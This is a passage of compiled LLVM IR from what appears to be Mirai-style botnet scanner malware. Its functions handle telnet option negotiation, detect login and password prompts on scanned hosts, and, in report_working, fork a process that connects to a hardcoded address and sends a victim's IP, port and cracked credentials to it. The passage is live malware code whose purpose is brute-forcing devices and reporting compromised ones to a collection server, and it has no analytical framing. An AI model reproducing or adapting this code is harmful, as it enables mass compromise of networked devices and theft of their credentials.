  store i8* %10, i8** %4, align 8
  br label %11

11:                                               ; preds = %136, %40, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 6
  %15 = load i32, i32* %14, align 4
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %137

17:                                               ; preds = %11
  %18 = load i8*, i8** %4, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 255
  br i1 %21, label %22, label %23

22:                                               ; preds = %17
  br label %137

23:                                               ; preds = %17
  %24 = load i8*, i8** %4, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 255
  br i1 %27, label %28, label %135

28:                                               ; preds = %23
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %30 = load i8*, i8** %4, align 8
  %31 = call signext i8 @can_consume(%struct.scanner_connection* noundef %29, i8* noundef %30, i32 noundef 1)
  %32 = icmp ne i8 %31, 0
  br i1 %32, label %34, label %33

33:                                               ; preds = %28
  br label %137

34:                                               ; preds = %28
  %35 = load i8*, i8** %4, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %38, 255
  br i1 %39, label %40, label %45

40:                                               ; preds = %34
  %41 = load i8*, i8** %4, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 2
  store i8* %42, i8** %4, align 8
  %43 = load i32, i32* %3, align 4
  %44 = add nsw i32 %43, 2
  store i32 %44, i32* %3, align 4
  br label %11, !llvm.loop !53

45:                                               ; preds = %34
  %46 = load i8*, i8** %4, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 1
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 253
  br i1 %50, label %51, label %81

51:                                               ; preds = %45
  %52 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %52, i8* align 1 getelementptr inbounds ([3 x i8], [3 x i8]* @__const.consume_iacs.tmp1, i32 0, i32 0), i64 3, i1 false)
  %53 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %53, i8* align 1 getelementptr inbounds ([9 x i8], [9 x i8]* @__const.consume_iacs.tmp2, i32 0, i32 0), i64 9, i1 false)
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %55 = load i8*, i8** %4, align 8
  %56 = call signext i8 @can_consume(%struct.scanner_connection* noundef %54, i8* noundef %55, i32 noundef 2)
  %57 = icmp ne i8 %56, 0
  br i1 %57, label %59, label %58

58:                                               ; preds = %51
  br label %137

59:                                               ; preds = %51
  %60 = load i8*, i8** %4, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 2
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp ne i32 %63, 31
  br i1 %64, label %65, label %66

65:                                               ; preds = %59
  br label %82

66:                                               ; preds = %59
  %67 = load i8*, i8** %4, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 3
  store i8* %68, i8** %4, align 8
  %69 = load i32, i32* %3, align 4
  %70 = add nsw i32 %69, 3
  store i32 %70, i32* %3, align 4
  %71 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 1
  %73 = load i32, i32* %72, align 8
  %74 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i64 0, i64 0
  %75 = call i64 @send(i32 noundef %73, i8* noundef %74, i64 noundef 3, i32 noundef 16384)
  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 1
  %78 = load i32, i32* %77, align 8
  %79 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i64 0, i64 0
  %80 = call i64 @send(i32 noundef %78, i8* noundef %79, i64 noundef 9, i32 noundef 16384)
  br label %133

81:                                               ; preds = %45
  br label %82

82:                                               ; preds = %81, %65
  %83 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %84 = load i8*, i8** %4, align 8
  %85 = call signext i8 @can_consume(%struct.scanner_connection* noundef %83, i8* noundef %84, i32 noundef 2)
  %86 = icmp ne i8 %85, 0
  br i1 %86, label %88, label %87

87:                                               ; preds = %82
  br label %137

88:                                               ; preds = %82
  store i32 0, i32* %5, align 4
  br label %89

89:                                               ; preds = %120, %88
  %90 = load i32, i32* %5, align 4
  %91 = icmp slt i32 %90, 3
  br i1 %91, label %92, label %123

92:                                               ; preds = %89
  %93 = load i8*, i8** %4, align 8
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %93, i64 %95
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 253
  br i1 %99, label %100, label %105

100:                                              ; preds = %92
  %101 = load i8*, i8** %4, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  store i8 -4, i8* %104, align 1
  br label %119

105:                                              ; preds = %92
  %106 = load i8*, i8** %4, align 8
  %107 = load i32, i32* %5, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %106, i64 %108
  %110 = load i8, i8* %109, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 251
  br i1 %112, label %113, label %118

113:                                              ; preds = %105
  %114 = load i8*, i8** %4, align 8
  %115 = load i32, i32* %5, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8, i8* %114, i64 %116
  store i8 -3, i8* %117, align 1
  br label %118

118:                                              ; preds = %113, %105
  br label %119

119:                                              ; preds = %118, %100
  br label %120

120:                                              ; preds = %119
  %121 = load i32, i32* %5, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %5, align 4
  br label %89, !llvm.loop !54

123:                                              ; preds = %89
  %124 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %124, i32 0, i32 1
  %126 = load i32, i32* %125, align 8
  %127 = load i8*, i8** %4, align 8
  %128 = call i64 @send(i32 noundef %126, i8* noundef %127, i64 noundef 3, i32 noundef 16384)
  %129 = load i8*, i8** %4, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 3
  store i8* %130, i8** %4, align 8
  %131 = load i32, i32* %3, align 4
  %132 = add nsw i32 %131, 3
  store i32 %132, i32* %3, align 4
  br label %133

133:                                              ; preds = %123, %66
  br label %134

134:                                              ; preds = %133
  br label %135

135:                                              ; preds = %134, %23
  br label %136

136:                                              ; preds = %135
  br label %11, !llvm.loop !53

137:                                              ; preds = %87, %58, %33, %22, %11
  %138 = load i32, i32* %3, align 4
  ret i32 %138
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @consume_user_prompt(%struct.scanner_connection* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sub nsw i32 %13, 1
  store i32 %14, i32* %5, align 4
  br label %15

15:                                               ; preds = %67, %1
  %16 = load i32, i32* %5, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %18, label %70

18:                                               ; preds = %15
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 7
  %21 = load i32, i32* %5, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [256 x i8], [256 x i8]* %20, i64 0, i64 %22
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 58
  br i1 %26, label %63, label %27

27:                                               ; preds = %18
  %28 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %29 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %28, i32 0, i32 7
  %30 = load i32, i32* %5, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [256 x i8], [256 x i8]* %29, i64 0, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 62
  br i1 %35, label %63, label %36

36:                                               ; preds = %27
  %37 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %38 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %37, i32 0, i32 7
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [256 x i8], [256 x i8]* %38, i64 0, i64 %40
  %42 = load i8, i8* %41, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 36
  br i1 %44, label %63, label %45

45:                                               ; preds = %36
  %46 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %47 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %46, i32 0, i32 7
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [256 x i8], [256 x i8]* %47, i64 0, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp eq i32 %52, 35
  br i1 %53, label %63, label %54

54:                                               ; preds = %45
  %55 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %56 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %55, i32 0, i32 7
  %57 = load i32, i32* %5, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %56, i64 0, i64 %58
  %60 = load i8, i8* %59, align 1
  %61 = sext i8 %60 to i32
  %62 = icmp eq i32 %61, 37
  br i1 %62, label %63, label %66

63:                                               ; preds = %54, %45, %36, %27, %18
  %64 = load i32, i32* %5, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %6, align 4
  br label %70

66:                                               ; preds = %54
  br label %67

67:                                               ; preds = %66
  %68 = load i32, i32* %5, align 4
  %69 = add nsw i32 %68, -1
  store i32 %69, i32* %5, align 4
  br label %15, !llvm.loop !55

70:                                               ; preds = %63, %15
  %71 = load i32, i32* %6, align 4
  %72 = icmp eq i32 %71, -1
  br i1 %72, label %73, label %107

73:                                               ; preds = %70
  call void @table_unlock_val(i8 noundef zeroext 26)
  call void @table_unlock_val(i8 noundef zeroext 27)
  %74 = call i8* @table_retrieve_val(i32 noundef 26, i32* noundef %8)
  store i8* %74, i8** %9, align 8
  %75 = call i8* @table_retrieve_val(i32 noundef 27, i32* noundef %8)
  store i8* %75, i8** %10, align 8
  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 7
  %78 = getelementptr inbounds [256 x i8], [256 x i8]* %77, i64 0, i64 0
  %79 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %80 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %79, i32 0, i32 6
  %81 = load i32, i32* %80, align 4
  %82 = load i8*, i8** %9, align 8
  %83 = load i32, i32* %8, align 4
  %84 = sub nsw i32 %83, 1
  %85 = call i32 @util_memsearch(i8* noundef %78, i32 noundef %81, i8* noundef %82, i32 noundef %84)
  %86 = icmp ne i32 %85, -1
  %87 = zext i1 %86 to i32
  store i32 %87, i32* %7, align 4
  br i1 %86, label %88, label %90

88:                                               ; preds = %73
  %89 = load i32, i32* %7, align 4
  store i32 %89, i32* %6, align 4
  br label %106

90:                                               ; preds = %73
  %91 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %92 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %91, i32 0, i32 7
  %93 = getelementptr inbounds [256 x i8], [256 x i8]* %92, i64 0, i64 0
  %94 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %95 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %94, i32 0, i32 6
  %96 = load i32, i32* %95, align 4
  %97 = load i8*, i8** %10, align 8
  %98 = load i32, i32* %8, align 4
  %99 = sub nsw i32 %98, 1
  %100 = call i32 @util_memsearch(i8* noundef %93, i32 noundef %96, i8* noundef %97, i32 noundef %99)
  %101 = icmp ne i32 %100, -1
  %102 = zext i1 %101 to i32
  store i32 %102, i32* %7, align 4
  br i1 %101, label %103, label %105

103:                                              ; preds = %90
  %104 = load i32, i32* %7, align 4
  store i32 %104, i32* %6, align 4
  br label %105

105:                                              ; preds = %103, %90
  br label %106

106:                                              ; preds = %105, %88
  br label %107

107:                                              ; preds = %106, %70
  call void @table_lock_val(i8 noundef zeroext 26)
  call void @table_lock_val(i8 noundef zeroext 27)
  %108 = load i32, i32* %6, align 4
  %109 = icmp eq i32 %108, -1
  br i1 %109, label %110, label %111

110:                                              ; preds = %107
  store i32 0, i32* %2, align 4
  br label %113

111:                                              ; preds = %107
  %112 = load i32, i32* %6, align 4
  store i32 %112, i32* %2, align 4
  br label %113

113:                                              ; preds = %111, %110
  %114 = load i32, i32* %2, align 4
  ret i32 %114
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @consume_pass_prompt(%struct.scanner_connection* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 6
  %12 = load i32, i32* %11, align 4
  %13 = sub nsw i32 %12, 1
  store i32 %13, i32* %5, align 4
  br label %14

14:                                               ; preds = %57, %1
  %15 = load i32, i32* %5, align 4
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %17, label %60

17:                                               ; preds = %14
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 7
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [256 x i8], [256 x i8]* %19, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp eq i32 %24, 58
  br i1 %25, label %53, label %26

26:                                               ; preds = %17
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 7
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [256 x i8], [256 x i8]* %28, i64 0, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 62
  br i1 %34, label %53, label %35

35:                                               ; preds = %26
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %37, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = sext i8 %41 to i32
  %43 = icmp eq i32 %42, 36
  br i1 %43, label %53, label %44

44:                                               ; preds = %35
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 7
  %47 = load i32, i32* %5, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [256 x i8], [256 x i8]* %46, i64 0, i64 %48
  %50 = load i8, i8* %49, align 1
  %51 = sext i8 %50 to i32
  %52 = icmp eq i32 %51, 35
  br i1 %52, label %53, label %56

53:                                               ; preds = %44, %35, %26, %17
  %54 = load i32, i32* %5, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %6, align 4
  br label %60

56:                                               ; preds = %44
  br label %57

57:                                               ; preds = %56
  %58 = load i32, i32* %5, align 4
  %59 = add nsw i32 %58, -1
  store i32 %59, i32* %5, align 4
  br label %14, !llvm.loop !56

60:                                               ; preds = %53, %14
  %61 = load i32, i32* %6, align 4
  %62 = icmp eq i32 %61, -1
  br i1 %62, label %63, label %80

63:                                               ; preds = %60
  call void @table_unlock_val(i8 noundef zeroext 25)
  %64 = call i8* @table_retrieve_val(i32 noundef 25, i32* noundef %9)
  store i8* %64, i8** %7, align 8
  %65 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %65, i32 0, i32 7
  %67 = getelementptr inbounds [256 x i8], [256 x i8]* %66, i64 0, i64 0
  %68 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %69 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %68, i32 0, i32 6
  %70 = load i32, i32* %69, align 4
  %71 = load i8*, i8** %7, align 8
  %72 = load i32, i32* %9, align 4
  %73 = sub nsw i32 %72, 1
  %74 = call i32 @util_memsearch(i8* noundef %67, i32 noundef %70, i8* noundef %71, i32 noundef %73)
  %75 = icmp ne i32 %74, -1
  %76 = zext i1 %75 to i32
  store i32 %76, i32* %8, align 4
  br i1 %75, label %77, label %79

77:                                               ; preds = %63
  %78 = load i32, i32* %8, align 4
  store i32 %78, i32* %6, align 4
  br label %79

79:                                               ; preds = %77, %63
  br label %80

80:                                               ; preds = %79, %60
  call void @table_lock_val(i8 noundef zeroext 25)
  %81 = load i32, i32* %6, align 4
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %84

83:                                               ; preds = %80
  store i32 0, i32* %2, align 4
  br label %86

84:                                               ; preds = %80
  %85 = load i32, i32* %6, align 4
  store i32 %85, i32* %2, align 4
  br label %86

86:                                               ; preds = %84, %83
  %87 = load i32, i32* %2, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @consume_any_prompt(%struct.scanner_connection* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %7 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %7, i32 0, i32 6
  %9 = load i32, i32* %8, align 4
  %10 = sub nsw i32 %9, 1
  store i32 %10, i32* %5, align 4
  br label %11

11:                                               ; preds = %63, %1
  %12 = load i32, i32* %5, align 4
  %13 = icmp sgt i32 %12, 0
  br i1 %13, label %14, label %66

14:                                               ; preds = %11
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 7
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i64 0, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = icmp eq i32 %21, 58
  br i1 %22, label %59, label %23

23:                                               ; preds = %14
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i64 0, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp eq i32 %30, 62
  br i1 %31, label %59, label %32

32:                                               ; preds = %23
  %33 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %34 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %33, i32 0, i32 7
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [256 x i8], [256 x i8]* %34, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = icmp eq i32 %39, 36
  br i1 %40, label %59, label %41

41:                                               ; preds = %32
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 7
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [256 x i8], [256 x i8]* %43, i64 0, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp eq i32 %48, 35
  br i1 %49, label %59, label %50

50:                                               ; preds = %41
  %51 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %52 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %51, i32 0, i32 7
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [256 x i8], [256 x i8]* %52, i64 0, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = icmp eq i32 %57, 37
  br i1 %58, label %59, label %62

59:                                               ; preds = %50, %41, %32, %23, %14
  %60 = load i32, i32* %5, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %6, align 4
  br label %66

62:                                               ; preds = %50
  br label %63

63:                                               ; preds = %62
  %64 = load i32, i32* %5, align 4
  %65 = add nsw i32 %64, -1
  store i32 %65, i32* %5, align 4
  br label %11, !llvm.loop !57

66:                                               ; preds = %59, %11
  %67 = load i32, i32* %6, align 4
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %69, label %70

69:                                               ; preds = %66
  store i32 0, i32* %2, align 4
  br label %72

70:                                               ; preds = %66
  %71 = load i32, i32* %6, align 4
  store i32 %71, i32* %2, align 4
  br label %72

72:                                               ; preds = %70, %69
  %73 = load i32, i32* %2, align 4
  ret i32 %73
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 noundef zeroext 10)
  %7 = call i8* @table_retrieve_val(i32 noundef 10, i32* noundef %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* noundef %10, i32 noundef %13, i8* noundef %14, i32 noundef %16)
  %18 = icmp ne i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %1
  call void @table_lock_val(i8 noundef zeroext 10)
  store i32 -1, i32* %2, align 4
  br label %37

20:                                               ; preds = %1
  call void @table_lock_val(i8 noundef zeroext 10)
  call void @table_unlock_val(i8 noundef zeroext 9)
  %21 = call i8* @table_retrieve_val(i32 noundef 9, i32* noundef %6)
  store i8* %21, i8** %4, align 8
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 7
  %24 = getelementptr inbounds [256 x i8], [256 x i8]* %23, i64 0, i64 0
  %25 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %26 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %25, i32 0, i32 6
  %27 = load i32, i32* %26, align 4
  %28 = load i8*, i8** %4, align 8
  %29 = load i32, i32* %6, align 4
  %30 = sub nsw i32 %29, 1
  %31 = call i32 @util_memsearch(i8* noundef %24, i32 noundef %27, i8* noundef %28, i32 noundef %30)
  store i32 %31, i32* %5, align 4
  call void @table_lock_val(i8 noundef zeroext 9)
  %32 = load i32, i32* %5, align 4
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

34:                                               ; preds = %20
  store i32 0, i32* %2, align 4
  br label %37

35:                                               ; preds = %20
  %36 = load i32, i32* %5, align 4
  store i32 %36, i32* %2, align 4
  br label %37

37:                                               ; preds = %35, %34, %19
  %38 = load i32, i32* %2, align 4
  ret i32 %38
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @report_working(i32 noundef %0, i16 noundef zeroext %1, %struct.scanner_auth* noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.scanner_auth*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store %struct.scanner_auth* %2, %struct.scanner_auth** %6, align 8
  %12 = call i32 @fork() #7
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* %8, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %18, label %15

15:                                               ; preds = %3
  %16 = load i32, i32* %8, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %19

18:                                               ; preds = %15, %3
  ret void

19:                                               ; preds = %15
  %20 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #7
  store i32 %20, i32* %9, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %23

22:                                               ; preds = %19
  call void @exit(i32 noundef 0) #9
  unreachable

23:                                               ; preds = %19
  call void @table_unlock_val(i8 noundef zeroext 2)
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call i32 @inet_addr(i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.16, i64 0, i64 0)) #7
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %27 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %26, i32 0, i32 0
  store i32 %25, i32* %27, align 4
  %28 = call i8* @table_retrieve_val(i32 noundef 2, i32* noundef null)
  %29 = bitcast i8* %28 to i16*
  %30 = load i16, i16* %29, align 2
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  call void @table_lock_val(i8 noundef zeroext 2)
  %32 = load i32, i32* %9, align 4
  %33 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @connect(i32 noundef %32, %struct.sockaddr* %36, i32 noundef 16)
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %42

39:                                               ; preds = %23
  %40 = load i32, i32* %9, align 4
  %41 = call i32 @close(i32 noundef %40)
  call void @exit(i32 noundef 0) #9
  unreachable

42:                                               ; preds = %23
  store i8 0, i8* %11, align 1
  %43 = load i32, i32* %9, align 4
  %44 = call i64 @send(i32 noundef %43, i8* noundef %11, i64 noundef 1, i32 noundef 16384)
  %45 = load i32, i32* %9, align 4
  %46 = bitcast i32* %4 to i8*
  %47 = call i64 @send(i32 noundef %45, i8* noundef %46, i64 noundef 4, i32 noundef 16384)
  %48 = load i32, i32* %9, align 4
  %49 = bitcast i16* %5 to i8*
  %50 = call i64 @send(i32 noundef %48, i8* noundef %49, i64 noundef 2, i32 noundef 16384)
  %51 = load i32, i32* %9, align 4
  %52 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %53 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %52, i32 0, i32 4
  %54 = call i64 @send(i32 noundef %51, i8* noundef %53, i64 noundef 1, i32 noundef 16384)
  %55 = load i32, i32* %9, align 4
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
